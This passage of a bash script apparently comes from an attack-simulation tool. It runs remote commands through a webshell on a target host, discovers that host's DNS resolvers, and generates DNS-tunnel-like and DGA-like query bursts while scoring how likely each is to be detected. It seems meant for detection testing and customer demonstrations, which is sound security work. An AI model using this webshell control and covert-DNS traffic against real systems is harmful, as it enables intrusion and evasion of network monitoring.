        DNS_TUNNEL_SKIP_REASON="${DNS_TUNNEL_DETECTION_REASON:-detection_criteria_not_met}"
    fi
    log_dns_tunnel_statistics
    dns_compute_tunnel_detection_likelihood
    if [[ "${result}" == success ]] && ! dns_tunnel_meets_detection_success; then
        result="partial"
    fi
    local avg_fqdn=0 avg_label=0 max_label=0 queries="${DNS_QUERIES_ATTEMPTED:-0}"
    queries=$(safe_int "${queries}")
    if (( queries > 0 && DNS_TUNNEL_FQDN_LEN_SUM > 0 )); then
        avg_fqdn=$((DNS_TUNNEL_FQDN_LEN_SUM / queries))
    fi
    if (( DNS_TUNNEL_LABEL_COUNT > 0 && DNS_TUNNEL_LABEL_LEN_SUM > 0 )); then
        avg_label=$((DNS_TUNNEL_LABEL_LEN_SUM / DNS_TUNNEL_LABEL_COUNT))
    fi
    max_label=$(safe_int "${DNS_TUNNEL_LABEL_LEN_MAX:-0}")
    local root_cause_suffix=""
    [[ "${result}" == failed && -n "${DNS_TUNNEL_LAST_ROOT_CAUSE:-}" ]] && root_cause_suffix=" root_cause=${DNS_TUNNEL_LAST_ROOT_CAUSE}"
    local msg="DNS_TUNNEL_FINAL_SUMMARY selected_resolver=${DNS_TUNNEL_SELECTED_RESOLVER:-${DNS_TARGET_SERVER:-n/a}} resolver_source=${DNS_TUNNEL_RESOLVER_SOURCE:-${DNS_TARGET_SELECTION_SOURCE:-unknown}} planned=${DNS_QUERIES_PLANNED:-0} attempted=${DNS_QUERIES_ATTEMPTED:-0} enhanced_attempted=${DNS_TUNNEL_ENH_ATTEMPTED:-0} fallback_attempted=${DNS_TUNNEL_FB_ATTEMPTED:-0} enhanced_result=${DNS_TUNNEL_ENH_RESULT:-skipped} fallback_result=${DNS_TUNNEL_FB_RESULT:-skipped} queries=${DNS_QUERIES_ATTEMPTED:-0} unique_queries=${DNS_TUNNEL_UNIQUE_QUERIES:-0} query_generated=${DNS_QUERY_GENERATED:-0} query_sent=${DNS_QUERY_SENT_COUNT:-0} query_responded=${DNS_QUERY_RESPONDED_COUNT:-0} generated_queries=${DNS_QUERY_GENERATED:-0} actual_dns_queries_sent=${DNS_QUERY_SENT_COUNT:-0} actual_dns_responses=${DNS_QUERY_RESPONDED_COUNT:-0} actual_dns_queries=${DNS_TUNNEL_ACTUAL_DNS_QUERIES:-0} actual_txt_queries=${DNS_TUNNEL_ACTUAL_TXT_QUERIES:-0} actual_unique_queries=${DNS_TUNNEL_UNIQUE_QUERIES:-0} actual_nxdomain=${DNS_TUNNEL_ACTUAL_NXDOMAIN:-0} resolver_validation_result=${DNS_RESOLVER_VALIDATION_RESULT:-failed} sensor_expected_visibility=${DNS_SENSOR_EXPECTED_VISIBILITY:-LOW} server_observed=${DNS_SERVER_OBSERVED_QUERIES:-0} internal_mismatch=${DNS_INTERNAL_VS_ACTUAL_MISMATCH:-no} avg_fqdn_length=${avg_fqdn} avg_label_length=${avg_label} max_label_length=${max_label} a_queries=${DNS_A_QUERIES:-0} txt_queries=${DNS_TXT_QUERIES:-0} nxdomain=${DNS_TUNNEL_NXDOMAIN_COUNT:-0} resolved=${DNS_TUNNEL_RESOLVED_COUNT:-0} timeout=${DNS_TUNNEL_TIMEOUT_COUNT:-0} error=${DNS_TUNNEL_ERROR_COUNT:-0} entropy_score=${DNS_TUNNEL_APPROX_ENTROPY:-0} detection_likelihood=${DNS_TUNNEL_DETECTION_LIKELIHOOD:-LOW} payload_bytes=${DNS_TUNNEL_LAST_PAYLOAD_BYTES:-0} webshell_method=${DNS_TUNNEL_LAST_WEBSHELL_METHOD:-${WEBSHELL_METHOD:-GET}} result=${result}${root_cause_suffix}"
    state_append "dns_tunnel_final_summary.log" "${msg}"
    dns_tunnel_log_both "${msg}"
}

dns_compute_tunnel_detection_likelihood() {
    local entropy="${DNS_TUNNEL_APPROX_ENTROPY:-0}" unique="${DNS_TUNNEL_UNIQUE_QUERIES:-0}"
    local a="${DNS_A_QUERIES:-0}" txt="${DNS_TXT_QUERIES:-0}"
    local enh_attempted=$(safe_int "${DNS_TUNNEL_ENH_ATTEMPTED:-0}")
    local fb_attempted=$(safe_int "${DNS_TUNNEL_FB_ATTEMPTED:-0}")
    entropy=$(safe_int "${entropy}")
    unique=$(safe_int "${unique}")
    a=$(safe_int "${a}")
    txt=$(safe_int "${txt}")
    DNS_TUNNEL_DETECTION_LIKELIHOOD="LOW"
    DNS_TUNNEL_DETECTION_REASON="simple_repetitive_queries entropy=${entropy} unique=${unique}"
    if (( entropy < 1 )); then
        DNS_TUNNEL_DETECTION_REASON="entropy_score=0 insufficient_tunnel_characteristics"
        return 0
    fi
    if (( enh_attempted == 0 && fb_attempted > 0 )); then
        DNS_TUNNEL_DETECTION_LIKELIHOOD="LOW"
        DNS_TUNNEL_DETECTION_REASON="fallback_only_nxdomain_burst enhanced_attempted=0 fallback_attempted=${fb_attempted}"
        (( fb_attempted >= 100 && unique > 50 )) && {
            DNS_TUNNEL_DETECTION_LIKELIHOOD="MEDIUM"
            DNS_TUNNEL_DETECTION_REASON="fallback_only_repetitive_queries fallback_attempted=${fb_attempted}"
        }
        return 0
    fi
    if (( entropy >= 45 && unique > 100 && a > 0 && txt > 0 )); then
        DNS_TUNNEL_DETECTION_LIKELIHOOD="HIGH"
        DNS_TUNNEL_DETECTION_REASON="entropy>${entropy}/10 unique>${unique} TXT+A_mixed"
        return 0
    fi
    if (( entropy >= 30 && unique > 50 )); then
        DNS_TUNNEL_DETECTION_LIKELIHOOD="MEDIUM"
        DNS_TUNNEL_DETECTION_REASON="entropy>${entropy}/10 unique>${unique}"
        return 0
    fi
}

log_dns_tunnel_statistics() {
    local avg_len=0 avg_label=0 max_label=0 queries="${DNS_QUERIES_ATTEMPTED:-0}"
    queries=$(safe_int "${queries}")
    if (( queries > 0 && DNS_TUNNEL_FQDN_LEN_SUM > 0 )); then
        avg_len=$((DNS_TUNNEL_FQDN_LEN_SUM / queries))
    elif (( DNS_TUNNEL_FQDN_COUNT > 0 )); then
        avg_len=$((DNS_TUNNEL_FQDN_LEN_SUM / DNS_TUNNEL_FQDN_COUNT))
    fi
    if (( DNS_TUNNEL_LABEL_COUNT > 0 && DNS_TUNNEL_LABEL_LEN_SUM > 0 )); then
        avg_label=$((DNS_TUNNEL_LABEL_LEN_SUM / DNS_TUNNEL_LABEL_COUNT))
    fi
    max_label=$(safe_int "${DNS_TUNNEL_LABEL_LEN_MAX:-0}")
    local msg="DNS_TUNNEL_STATISTICS queries=${queries} unique_queries=${DNS_TUNNEL_UNIQUE_QUERIES:-0} average_length=${avg_len} avg_fqdn_length=${avg_len} avg_label_length=${avg_label} max_label_length=${max_label} entropy_score=${DNS_TUNNEL_APPROX_ENTROPY:-0} txt_queries=${DNS_TXT_QUERIES:-0} a_queries=${DNS_A_QUERIES:-0} nxdomain=${DNS_TUNNEL_NXDOMAIN_COUNT:-0} resolved=${DNS_TUNNEL_RESOLVED_COUNT:-0} detection_likelihood=${DNS_TUNNEL_DETECTION_LIKELIHOOD:-LOW}"
    state_append "dns_tunnel_statistics.log" "${msg}"
    dns_tunnel_log_both "${msg}"
    local txt_q=$(safe_int "${DNS_TXT_QUERIES:-0}") a_q=$(safe_int "${DNS_A_QUERIES:-0}") txt_ratio=0
    (( txt_q + a_q > 0 )) && txt_ratio=$((txt_q * 100 / (txt_q + a_q)))
    local profile="DNS_TUNNEL_PAYLOAD_PROFILE avg_label_length=${avg_label} max_label_length=${max_label} avg_fqdn_length=${avg_len} entropy_score=${DNS_TUNNEL_APPROX_ENTROPY:-0} txt_ratio_pct=${txt_ratio} a_ratio_pct=$((100 - txt_ratio))"
    state_append "dns_tunnel_statistics.log" "${profile}"
    dns_tunnel_log_both "${profile}"
}

emit_poc_customer_explanation() {
    local block=""
    block="CUSTOMER_EXPLANATION

DNS Tunnel:
- Generated ${DNS_QUERIES_ATTEMPTED:-0} DNS queries
- Average entropy $(awk -v e="${DNS_TUNNEL_APPROX_ENTROPY:-0}" 'BEGIN{printf "%.1f", e/10}')
- ${DNS_TUNNEL_UNIQUE_QUERIES:-0} unique subdomains
- Detection likelihood ${DNS_TUNNEL_DETECTION_LIKELIHOOD:-LOW}

DGA:
- Generated ${DGA_GENERATED_COUNT:-${DGA_TOTAL_QUERIES:-0}} domains
- ${DGA_NXDOMAIN_COUNT:-0} NXDOMAIN
- Entropy $(awk -v e="${DGA_ENTROPY_SCORE:-0}" 'BEGIN{printf "%.1f", e/10}')
- Detection likelihood ${DGA_DETECTION_LIKELIHOOD:-LOW}"
    state_append "customer_explanation.log" "${block//$'\n'/ ; }"
    log_message "OK" "CUSTOMER_EXPLANATION emitted (DNS/DGA telemetry summary for operator review)"
    if declare -F poc_customer_emit_block >/dev/null 2>&1; then
        poc_customer_emit_block "${block}"
    fi
}

dns_tunnel_map_selection_source() {
    case "${1:-}" in
        scan) printf '%s' "target_dns" ;;
        resolver|systemd-resolved) printf '%s' "system_resolver" ;;
        user) printf '%s' "operator_dns" ;;
        fallback) printf '%s' "fallback" ;;
        *) printf '%s' "${1:-unknown}" ;;
    esac
}

log_webshell_post_test() {
    local http_code="$1" body_contains_marker="$2" exit_code="$3" result="$4" reason="$5"
    local msg="WEBSHELL_POST_TEST url=${WEB_SHELL_URL} http_code=${http_code} body_contains_marker=${body_contains_marker} exit_code=${exit_code} result=${result} reason=${reason}"
    state_append "webshell_post_test.log" "${msg}"
    append_dns_tunnel_wave_log "${msg}"
    log_message "OK" "${msg}" >&2
}

validate_webshell_post_exec() {
    local saved_method="${WEBSHELL_METHOD}" wrapped raw_body http_code="${WEBSHELL_LAST_HTTP_CODE:-000}"
    local exit_code="" body_contains_marker=no result=fail reason=""
    if [[ "${DRY_RUN}" == true ]]; then
        log_webshell_post_test "200" yes 0 success dry-run
        return 0
    fi
    WEBSHELL_METHOD=POST
    wrapped=$(wrap_remote_payload "echo POST_EXEC_OK" "quick")
    raw_body=$(webshell_curl_transport "${wrapped}" 12)
    http_code="${WEBSHELL_LAST_HTTP_CODE:-000}"
    WEBSHELL_METHOD="${saved_method}"
    [[ "${raw_body}" == *"POST_EXEC_OK"* ]] && body_contains_marker=yes
    if [[ "${raw_body}" == *"__EXIT_CODE:"* ]]; then
        exit_code=$(sed -n 's/.*__EXIT_CODE:\([0-9][0-9]*\).*/\1/p' <<< "${raw_body}" | tail -n1)
    fi
    if [[ -z "${raw_body}" ]]; then
        reason=empty_response
    elif [[ -z "${http_code}" || "${http_code}" == "000" ]]; then
        reason=timeout
    elif [[ ! "${http_code}" =~ ^2[0-9][0-9]$ ]]; then
        reason=http_not_2xx
    elif [[ "${body_contains_marker}" != yes ]]; then
        reason=marker_missing
    elif [[ -z "${exit_code}" ]]; then
        reason=exit_code_missing
    elif [[ "${exit_code}" != "0" ]]; then
        reason=exit_code_nonzero
    else
        result=success
        reason=ok
    fi
    log_webshell_post_test "${http_code}" "${body_contains_marker}" "${exit_code:-}" "${result}" "${reason}"
    [[ "${result}" == success ]]
}

generate_dns_safe_random_label() {
    local min_len="${1:-16}" max_len="${2:-48}" style="${3:-base32}" out="" span
    min_len=$(safe_int "${min_len}")
    max_len=$(safe_int "${max_len}")
    (( max_len < min_len )) && max_len="${min_len}"
    span=$((max_len - min_len + 1))
    (( span < 1 )) && span=1
    local want=$((min_len + RANDOM % span))
    if command -v openssl >/dev/null 2>&1; then
        if [[ "${style}" == base32 ]]; then
            out=$(openssl rand -base32 "$((want + 8))" 2>/dev/null | tr -dc 'A-Z2-7' | head -c "${want}")
        else
            out=$(openssl rand -base64 "$((want + 8))" 2>/dev/null | tr '+/=' '-_' | tr -dc 'A-Za-z0-9_-' | head -c "${want}")
        fi
        if [[ -z "${out}" ]]; then
            out=$(openssl rand -hex "$((want / 2 + 4))" 2>/dev/null | tr -dc 'a-f0-9' | head -c "${want}")
        fi
    fi
    if [[ -z "${out}" && -r /dev/urandom ]]; then
        out=$(head -c "$((want * 2))" /dev/urandom 2>/dev/null | base64 2>/dev/null | tr '+/=' '-_' | tr -dc 'A-Za-z0-9_-' | head -c "${want}")
    fi
    if [[ -z "${out}" ]] && command -v python3 >/dev/null 2>&1; then
        out=$(python3 -c "import random,string; print(''.join(random.choice(string.ascii_lowercase+string.digits) for _ in range(${want})))" 2>/dev/null)
    fi
    if [[ -z "${out}" ]]; then
        out="poc${RANDOM}${RANDOM}$(date +%s | tail -c 6)"
    fi
    out=$(printf '%s' "${out}" | tr -cd 'A-Za-z0-9_-' | head -c 63)
    while (( ${#out} < min_len )); do
        out="${out}$(printf '%x' $((RANDOM % 16)))"
    done
    printf '%s' "${out}"
}

generate_cluster_local_queries() {
    local count="${1:-120}" i ns="poc-lab" svc suffix fqdn
    local -a services=(
        "elasticsearch-cluster"
        "cv-svc-poc-lab-softwaremanagement-v1-repositoryconfigservice"
        "cv-svc-poc-lab-studio-topology-v1-decommissionservice"
        "cv-svc-poc-lab-systemauth-v1-credentialservice"
        "cv-svc-poc-lab-configlet-v1-configletservice"
        "telemetry-sync-v1-statestoreservice"
        "inventory-api-v2-catalogservice"
    )
    local -a namespaces=("default" "kube-system" "poc-lab")
    count=$(safe_int "${count}")
    (( count < 1 )) && count=120
    for ((i = 0; i < count; i++)); do
        svc="${services[i % ${#services[@]}]}"
        ns="${namespaces[i % ${#namespaces[@]}]}"
        suffix=$(generate_dns_safe_random_label 4 8 base32)
        fqdn="${svc}-${suffix}.${ns}.svc.${ns}.cluster.local"
        printf '%s A\n' "${fqdn}"
    done
}

generate_infrastructure_queries() {
    local count="${1:-100}" domain="${2:-${DNS_TUNNEL_DOMAIN_SUFFIX}}" i prefix rand_label fqdn qtype
    local -a prefixes=("rpc-provenance" "rpc-akash" "rpc-secret" "rpc-dymension" "kcr-lambda")
    count=$(safe_int "${count}")
    (( count < 1 )) && count=100
    domain="${domain:-poc-dns-test.local}"
    for ((i = 0; i < count; i++)); do
        prefix="${prefixes[i % ${#prefixes[@]}]}"
        rand_label=$(generate_dns_safe_random_label 10 20 base32)
        fqdn="${prefix}.${rand_label}.${domain}"
        if (( i % 3 == 1 )); then
            qtype="TXT"
        else
            qtype="A"
        fi
        printf '%s %s\n' "${fqdn}" "${qtype}"
    done
}

generate_txt_burst_queries() {
    local count="${1:-50}" domain="${2:-${DNS_TUNNEL_DOMAIN_SUFFIX}}" i chunk1 chunk2 chunk3 fqdn
    count=$(safe_int "${count}")
    (( count < 30 )) && count=30
    domain="${domain:-poc-dns-test.local}"
    for ((i = 0; i < count; i++)); do
        chunk1=$(generate_dns_safe_random_label 50 60 base64url)
        chunk2=$(generate_dns_safe_random_label 50 60 base32)
        chunk3=$(generate_dns_safe_random_label 8 16 base32)
        fqdn="${chunk1}.${chunk2}.${chunk3}.${domain}"
        if (( ${#fqdn} > 253 )); then
            fqdn="${chunk1:0:55}.${chunk3}.${domain}"
        fi
        printf '%s TXT\n' "${fqdn}"
    done
}

discover_dns_servers_from_scan() {
    collect_dns_tunnel_targets
}

dns_resolver_is_stub() {
    case "${1:-}" in
        127.0.0.53) return 0 ;;
        *) return 1 ;;
    esac
}

build_discover_dns_upstream_remote_cmd() {
    remote_bash_script_open 'DNS_UPSTREAM_SCRIPT'
    cat <<EOF
${REMOTE_SHELL_HELPERS}
stub=""
source="unknown"
upstream=""
upstream_all=""
if [ -f /etc/resolv.conf ]; then
stub=\$(awk '/^nameserver[[:space:]]+/ {print \$2; exit}' /etc/resolv.conf 2>/dev/null)
fi
collect_resolvers() {
awk '{
    for (i = 1; i <= NF; i++) {
    if (\$i ~ /^([0-9]{1,3}\.){3}[0-9]{1,3}\$/) print \$i
    }
}' | sort -u
}
filter_stub() {
grep -Ev '^127\\.0\\.0\\.53\$' || true
}
if command -v resolvectl >/dev/null 2>&1; then
source="systemd-resolved"
upstream_all=\$(
    {
    resolvectl dns 2>/dev/null
    resolvectl status 2>/dev/null
    } | collect_resolvers | filter_stub | paste -sd',' -
)
elif [ -f /etc/resolv.conf ]; then
source="resolv.conf"
upstream_all=\$(awk '/^nameserver[[:space:]]+/ {print \$2}' /etc/resolv.conf 2>/dev/null | filter_stub | paste -sd',' -)
fi
if command -v powershell >/dev/null 2>&1; then
win_dns=\$(powershell -NoProfile -Command "(Get-DnsClientServerAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ServerAddresses | Where-Object { \$_ -ne '127.0.0.53' } | Select-Object -First 1)" 2>/dev/null | tr -d '\\r')
if [ -n "\${win_dns}" ]; then
    [ -z "\${upstream_all}" ] && upstream_all="\${win_dns}" || upstream_all="\${upstream_all},\${win_dns}"
    [ "\${source}" = "unknown" ] && source="windows-dns-client"
fi
elif command -v ipconfig >/dev/null 2>&1; then
win_dns=\$(ipconfig /all 2>/dev/null | awk -F': *' '/DNS Servers/ {gsub(/[^0-9.]/," ",\$2); for(i=1;i<=NF;i++) if(\$i ~ /^([0-9]{1,3}\\.){3}[0-9]{1,3}\$/ && \$i != "127.0.0.53") {print \$i; exit}}')
if [ -n "\${win_dns}" ]; then
    [ -z "\${upstream_all}" ] && upstream_all="\${win_dns}" || upstream_all="\${upstream_all},\${win_dns}"
    [ "\${source}" = "unknown" ] && source="windows-ipconfig"
fi
fi
if [ -n "\${upstream_all}" ]; then
upstream="\${upstream_all%%,*}"
fi
printf 'DNS_RESOLVER_PROBE resolver_source=%s stub_resolver=%s upstream_dns=%s upstream_all=%s\\n' \\
"\${source}" "\${stub:-}" "\${upstream:-}" "\${upstream_all:-}"
EOF
    remote_bash_script_close 'DNS_UPSTREAM_SCRIPT'
}

parse_dns_resolver_probe_line() {
    local out="$1" line=""
    local resolver_source="" stub_resolver="" upstream_dns="" upstream_all=""
    line=$(printf '%s\n' "${out}" | tr -d '\r' | grep -E 'DNS_RESOLVER_PROBE' | tail -n1 || true)
    [[ -n "${line}" ]] || return 1
    resolver_source=$(dns_stats_field_from_line "${line}" resolver_source)
    stub_resolver=$(dns_stats_field_from_line "${line}" stub_resolver)
    upstream_dns=$(dns_stats_field_from_line "${line}" upstream_dns)
    upstream_all=$(dns_stats_field_from_line "${line}" upstream_all)
    printf '%s %s %s %s\n' "${resolver_source}" "${stub_resolver}" "${upstream_dns}" "${upstream_all}"
}

discover_dns_upstream_from_webshell() {
    local out="" resolver_source="" stub_resolver="" upstream_dns="" upstream_all="" host
    DNS_RESOLVER_SOURCE=""
    DNS_STUB_RESOLVER=""
    DNS_UPSTREAM_DNS=""
    if [[ "${DRY_RUN}" == true ]]; then
        DNS_STUB_RESOLVER="127.0.0.53"
        DNS_RESOLVER_SOURCE="systemd-resolved"
        DNS_UPSTREAM_DNS="10.10.10.5"
        printf '%s\n' "10.10.10.5"
        return 0
    fi
    out=$(run_webshell_quick "dns-upstream-discover" "$(build_discover_dns_upstream_remote_cmd)" 2>/dev/null || true)
    read -r resolver_source stub_resolver upstream_dns upstream_all <<< "$(parse_dns_resolver_probe_line "${out}" 2>/dev/null || true)"
    DNS_RESOLVER_SOURCE="${resolver_source:-unknown}"
    DNS_STUB_RESOLVER="${stub_resolver:-}"
    DNS_UPSTREAM_DNS=$(poc_extract_ipv4 "${upstream_dns}")
    if [[ -n "${upstream_all}" ]]; then
        local IFS=','
        for host in ${upstream_all}; do
            host=$(poc_extract_ipv4 "${host}")
            [[ -z "${host}" ]] && continue
            dns_resolver_is_stub "${host}" && continue
            printf '%s\n' "${host}"
        done
        return 0
    fi
    host=$(poc_extract_ipv4 "${upstream_dns}")
    if [[ -n "${host}" ]] && ! dns_resolver_is_stub "${host}"; then
        printf '%s\n' "${host}"
    fi
}

discover_dns_resolver_from_webshell() {
    discover_dns_upstream_from_webshell | awk 'NF {print; exit}'
}

log_dns_resolver_discovery() {
    local msg="DNS_RESOLVER_DISCOVERY resolver_source=${DNS_RESOLVER_SOURCE:-unknown} stub_resolver=${DNS_STUB_RESOLVER:-} upstream_dns=${DNS_UPSTREAM_DNS:-} selected_dns=${DNS_SELECTED_DNS:-} reason=${DNS_RESOLVER_REASON:-unknown}"
    state_append "dns_resolver_discovery.log" "${msg}"
    append_dns_tunnel_wave_log "${msg}"
    log_message "OK" "${msg}" >&2
}

log_dns_resolver_selected() {
    local resolver="$1" source="$2" validated="$3"
    local resolver_type="forwarder"
    local upstream_unknown="yes"
    case "${source}" in
        scan) resolver_type="forwarder" ;;
        systemd-resolved|resolver) resolver_type="forwarder" ;;
        user|fallback) resolver_type="resolver" ;;
    esac
    [[ "${resolver_type}" == "resolver" ]] && upstream_unknown="no"
    DNS_RESOLVER_SELECTED_TYPE="${resolver_type}"
    DNS_FORWARDER_MODE_UPSTREAM_UNKNOWN="${upstream_unknown}"
    local selected_msg="DNS_RESOLVER_SELECTED resolver=${resolver} resolver_type=${resolver_type} validation_result=${validated} source=${source}"
    local fw_msg="DNS_FORWARDER_MODE resolver=${resolver} resolver_type=${resolver_type} upstream_unknown=${upstream_unknown}"
    state_append "dns_resolver_discovery.log" "${selected_msg}"
    state_append "dns_resolver_discovery.log" "${fw_msg}"
    dns_tunnel_log_both "${selected_msg}"
    dns_tunnel_log_both "${fw_msg}"
}

select_dns_tunnel_target() {
    dns_tunnel_guard_legacy_call "dns tunnel simulator" && return 1
    local scan_hosts target="" source="" detail="" host fallback_hosts="" resolver_source=""
    local validated_target="" scan_fallback="" upstream_host validated=false
    DNS_TUNNEL_FALLBACK_RESOLVER=false
    DNS_TUNNEL_SKIP_REASON=""
    DNS_STUB_RESOLVER=""
    DNS_UPSTREAM_DNS=""
    DNS_RESOLVER_SOURCE=""
    DNS_RESOLVER_REASON=""
    DNS_SELECTED_DNS=""

    scan_hosts=$(discover_dns_servers_from_scan)
    while IFS= read -r host; do
        [[ -z "${host}" ]] && continue
        host=$(poc_extract_ipv4 "${host}")
        [[ -z "${host}" ]] && continue
        dns_resolver_is_stub "${host}" && continue
        [[ -z "${scan_fallback}" ]] && scan_fallback="${host}"
        if [[ -z "${validated_target}" ]] && validate_dns_server_remote "${host}" "scan"; then
            validated_target="${host}"
        fi
    done <<< "${scan_hosts}"

    if [[ -n "${validated_target}" ]]; then
        target="${validated_target}"
        source="scan"
        detail="target-net DNS server from dns_hosts.txt/usable_dns_hosts.txt (query-validated)"
        DNS_RESOLVER_REASON="target_net_dns_validated"
        validated=true
    elif [[ -n "${scan_fallback}" ]]; then
        target="${scan_fallback}"
        source="scan"
        detail="target-net DNS server from dns_hosts.txt/usable_dns_hosts.txt"
        DNS_RESOLVER_REASON="target_net_dns_discovered"
        validate_dns_server_remote "${target}" "scan" >/dev/null 2>&1 || true
    fi

    if [[ -z "${target}" ]]; then
        while IFS= read -r upstream_host; do
            [[ -z "${upstream_host}" ]] && continue
            upstream_host=$(poc_extract_ipv4 "${upstream_host}")
            [[ -z "${upstream_host}" ]] && continue
            dns_resolver_is_stub "${upstream_host}" && continue
            [[ -z "${DNS_UPSTREAM_DNS}" ]] && DNS_UPSTREAM_DNS="${upstream_host}"
            if [[ -z "${target}" ]]; then
                target="${upstream_host}"
                source="systemd-resolved"
                detail="upstream DNS from resolvectl (stub ${DNS_STUB_RESOLVER:-127.0.0.53} excluded)"
                DNS_RESOLVER_REASON="using_upstream_resolver"
                DNS_TUNNEL_FALLBACK_RESOLVER=true
            fi
            if validate_dns_server_remote "${upstream_host}" "resolver"; then
                target="${upstream_host}"
                source="systemd-resolved"
                detail="upstream DNS from resolvectl (query-validated; stub excluded)"
                DNS_RESOLVER_REASON="using_upstream_resolver_validated"
                DNS_UPSTREAM_DNS="${upstream_host}"
                validated=true
                break
            fi
        done < <(discover_dns_upstream_from_webshell)
    fi

    if [[ -z "${target}" ]]; then
        fallback_hosts="${DNS_TUNNEL_USER_SERVER} 8.8.8.8"
        for host in ${fallback_hosts}; do
            [[ -z "${host}" ]] && continue
            host=$(poc_extract_ipv4 "${host}")
            [[ -z "${host}" ]] && continue
            dns_resolver_is_stub "${host}" && continue
            target="${host}"
            if [[ "${host}" == "${DNS_TUNNEL_USER_SERVER}" ]]; then
                source="user"
                detail="operator --dns-server"
                DNS_RESOLVER_REASON="operator_dns_server"
            else
                source="fallback"
                detail="default public resolver"
                DNS_RESOLVER_REASON="public_fallback_resolver"
            fi
            DNS_TUNNEL_FALLBACK_RESOLVER=true
            if validate_dns_server_remote "${host}" "${source}"; then
                DNS_RESOLVER_REASON="${DNS_RESOLVER_REASON}_validated"
                validated=true
            else
                DNS_RESOLVER_REASON="${DNS_RESOLVER_REASON}_validation_failed_continuing"
            fi
            break
        done
    fi

    if [[ -z "${target}" ]]; then
        DNS_TARGET_SERVER=""
        DNS_TARGET_SELECTION_SOURCE=""
        DNS_TARGET_SELECTION_DETAIL=""
        DNS_TUNNEL_SELECTED_RESOLVER=""
        DNS_TUNNEL_RESOLVER_SOURCE=""
        DNS_TUNNEL_SKIP_REASON="dns_server_validation_failed"
        DNS_RESOLVER_REASON="no_resolver_available"
        log_dns_resolver_discovery
        dns_tunnel_log_both "skip reason=dns_server_validation_failed"
        log_message "WARN" "DNS resolver discovery failed — no non-stub resolver available" >&2
        return 1
    fi

    if [[ "${validated}" != true && "${DNS_RESOLVER_REASON}" != *"_continuing"* ]]; then
        DNS_RESOLVER_REASON="${DNS_RESOLVER_REASON}_validation_failed_continuing"
    fi

    if [[ -z "${DNS_STUB_RESOLVER}" ]]; then
        discover_dns_upstream_from_webshell >/dev/null || true
    fi

    resolver_source=$(dns_tunnel_map_selection_source "${source}")
    DNS_TARGET_SERVER="${target}"
    DNS_SELECTED_DNS="${target}"
    DNS_TARGET_SELECTION_SOURCE="${source}"
    DNS_TARGET_SELECTION_DETAIL="${detail}"
    DNS_TUNNEL_SELECTED_RESOLVER="${target}"
    DNS_TUNNEL_RESOLVER_SOURCE="${resolver_source}"
    DNS_TUNNEL_SKIP_REASON=""
    log_dns_resolver_discovery
    log_dns_tunnel_selected_resolver "${target}" "${resolver_source}" "${detail}"
    log_dns_resolver_selected "${target}" "${source}" "${DNS_RESOLVER_VALIDATION_RESULT:-failed}"
    if [[ "${DNS_TUNNEL_FALLBACK_RESOLVER}" == true ]]; then
        dns_tunnel_log_both "fallback_resolver active source=${resolver_source} server=${target} reason=${DNS_RESOLVER_REASON}"
    fi
    dns_tunnel_log_both "target_selection source=${source} resolver_source=${resolver_source} server=${target} detail=${detail} fallback_resolver=${DNS_TUNNEL_FALLBACK_RESOLVER}"
    log_message "OK" "DNS target selection: source=${resolver_source} server=${target} (${detail})" >&2
    printf '%s' "${target}"
}

resolve_dns_tunnel_query_tool() {
    DNS_TUNNEL_QUERY_TOOL=""
    DNS_TUNNEL_SKIP_REASON=""
    if [[ "${HAS_dig:-false}" == true ]]; then
        DNS_TUNNEL_QUERY_TOOL="dig"
        return 0
    fi
    if [[ "${HAS_nslookup:-false}" == true ]]; then
        DNS_TUNNEL_QUERY_TOOL="nslookup"
        return 0
    fi
    if [[ "${HAS_host:-false}" == true ]]; then
        DNS_TUNNEL_QUERY_TOOL="host"
        return 0
    fi
    if [[ "${HAS_python3:-false}" == true ]]; then
        DNS_TUNNEL_QUERY_TOOL="python3"
        return 0
    fi
    DNS_TUNNEL_SKIP_REASON="dig/nslookup/host/python3 unavailable on webshell host"
    return 1
}

append_dga_simulation_log() {
    local msg="$1"
    mkdir -p "${LOG_DIR}"
    printf '%s\n' "[$(date '+%Y-%m-%d %H:%M:%S')] cycle=${CURRENT_CYCLE:-1} ${msg}" >> "${LOG_DIR}/dga_simulation.log"
}

dga_simulation_log_both() {
    local msg="$1"
    append_dga_simulation_log "${msg}"
    state_append "dga_simulation.log" "cycle=${CURRENT_CYCLE:-1} ${msg}"
    log_message "OK" "${msg}" >&2
}

webshell_chunk_debug_tail() {
    local out="$1" max_bytes="${2:-500}"
    printf '%s' "${out}" | tr -d '\r' | tail -c "${max_bytes}" | tr '\n' ' ' | sed 's/  */ /g'
}

log_webshell_chunk_debug() {
    local tag="$1" chunk="$2" out="$3" reason="${4:-unknown}"
    local http_status="${WEBSHELL_LAST_HTTP_CODE:-000}"
    local exit_code="${WEBSHELL_LAST_EXIT_CODE:-}"
    local response_bytes="${#out}"
    local stdout_tail stderr_tail msg=""
    stdout_tail=$(webshell_chunk_debug_tail "${out}" 500)
    stderr_tail=$(printf '%s' "${out}" | tr -d '\r' | grep -iE 'error|fail|denied|timeout|refused|not found' | tail -n3 | tr '\n' ' ' | head -c 300)
    [[ -z "${exit_code}" ]] && exit_code=$(sed -n 's/.*__EXIT_CODE:\([0-9][0-9]*\).*/\1/p' <<< "${out}" | tail -n1)
    [[ -z "${exit_code}" ]] && exit_code="n/a"
    msg="${tag} chunk=${chunk} http_status=${http_status} exit_code=${exit_code} response_bytes=${response_bytes} stdout_tail=${stdout_tail} stderr_tail=${stderr_tail} reason=${reason}"
    case "${tag}" in
        DNS_ENHANCED_CHUNK_DEBUG|DNS_TUNNEL_ENHANCED_CHUNK_DEBUG)
            dns_tunnel_log_both "${msg}"
            ;;
        DGA_CHUNK_DEBUG)
            dga_simulation_log_both "${msg}"
            ;;
        *)
            log_message "OK" "${msg}" >&2
            ;;
    esac
}

resolve_dga_query_tool() {
    DGA_QUERY_TOOL=""
    DGA_SKIP_REASON=""
    if [[ "${HAS_dig:-false}" == true ]]; then
        DGA_QUERY_TOOL="dig"
        return 0
    fi
    if [[ "${HAS_nslookup:-false}" == true ]]; then
        DGA_QUERY_TOOL="nslookup"
        return 0
    fi
    if [[ "${HAS_host:-false}" == true ]]; then
        DGA_QUERY_TOOL="host"
        return 0
    fi
    if [[ "${HAS_getent:-false}" == true ]]; then
        DGA_QUERY_TOOL="getent"
        return 0
    fi
    if [[ "${HAS_python3:-false}" == true ]]; then
        DGA_QUERY_TOOL="python3"
        return 0
    fi
    DGA_QUERY_TOOL="dig"
    DGA_SKIP_REASON=""
